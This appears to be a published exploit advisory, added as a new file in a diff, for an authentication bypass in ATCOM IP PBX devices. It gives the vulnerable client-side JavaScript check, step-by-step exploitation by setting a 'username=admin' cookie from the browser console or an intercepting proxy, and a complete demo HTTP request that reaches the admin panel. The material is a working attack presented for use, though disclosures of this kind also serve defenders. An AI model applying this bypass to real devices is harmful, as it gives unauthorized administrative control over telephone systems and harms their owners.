@@ -1,0 +1,45 @@
+# Title: ATCOM PBX system , auth bypass exploit
+# Author: i-Hmx
+# contact : n0p1337@gmail.com
+# Home : sec4ever.com
+# Tested on : ATCOM IP01 , IP08 , IP4G and ip2G4A
+
+Details
+The mentioned system is affected by auth bypass flaw that allow an attacker to get admin access on the vulnerable machine without perior access
+The security check is really stupid , depend on js
+affected lines
+
+js/util.js
+function alertWithoutLogin(){
+    var username = getCookie("username");
+    //alert(username);
+    if(!!!username){
+        alert('Sorry, permission denied. Please login first!');
+    }
+}
+
+so actually it just check if username value exist in cookies
+and if not , redirect to login.html
+just like that!!!!!!!!!!!!!
+
+exploitation?!
+just from browser , press f12 , open console
+type document.cookie="username=admin"
+or from burp intercept proxy and set the cookies as well
+go to ip/admin/index.html
+and you are in , simple like that :/
+
+Demo request
+
+GET /admin/index.html HTTP/1.1
+Host: 192.168.44.12
+User-Agent: Mozilla/1.0 (Windows NT 3.3; WOW32; rv:60.0) Gecko/20010101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: username=admin
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+From Eg-R1z with love
+./Faris
